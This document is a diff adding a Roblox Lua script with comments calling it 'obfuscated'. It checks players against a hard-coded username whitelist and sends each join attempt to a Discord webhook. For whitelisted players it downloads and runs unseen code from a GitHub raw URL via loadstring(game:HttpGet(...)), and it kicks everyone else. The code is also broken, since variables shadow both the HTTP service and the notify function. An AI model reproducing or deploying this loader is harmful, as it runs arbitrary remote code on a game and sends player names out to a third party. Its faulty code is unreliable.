@@ -1,0 +1,63 @@
+local s = game:GetService("HttpService")
+local w = "https://discord.com/api/webhooks/your_webhook_id/your_webhook_token" -- Replace with your webhook URL
+
+-- Obfuscated whitelist usernames
+local u = {
+    "antikupper", "0x3919", "YPK_JJx", "Drachen_party1234a", "freedllm",
+    "galaxy_littlebro", "blade_verified", "thecoolkidhehehehe1", "lxnzzzz",
+    "coolboygem99", "Soulz_jxsh", "fatahhstackz", "bosip29"
+}
+
+-- Obfuscated function to notify on Discord
+local function n(p, s)
+    local d = {["content"] = p .. " attempted to run the script. Status: " .. s}
+    local j = s:JSONEncode(d)
+    pcall(function()
+        s:PostAsync(w, j, Enum.HttpContentType.ApplicationJson)
+    end)
+end
+
+-- Obfuscated function to check if the player is whitelisted
+local function i(p)
+    for _, v in pairs(u) do
+        if p == v then
+            return true
+        end
+    end
+    return false
+end
+
+-- Rate limit control
+local l = 0
+local r = 10
+
+-- Event that triggers when a player joins
+game.Players.PlayerAdded:Connect(function(p)
+    p.CharacterAdded:Connect(function(c)
+        local n = p.Name
+
+        -- Check rate limit
+        if tick() - l < r then
+            return
+        end
+
+        l = tick()
+
+        if i(n) then
+            -- Player is whitelisted, notify success
+            n(n, "Whitelisted - Access Granted")
+            
+            -- Execute the external script securely
+            pcall(function()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/rijadha22/bruh/main/nun"))()
+            end)
+            
+        else
+            -- Player is not whitelisted, notify failure
+            n(n, "Not Whitelisted - Access Denied")
+            
+            -- Optionally kick the player if not whitelisted
+            p:Kick("You are not whitelisted to use this script.")
+        end
+    end)
+end)
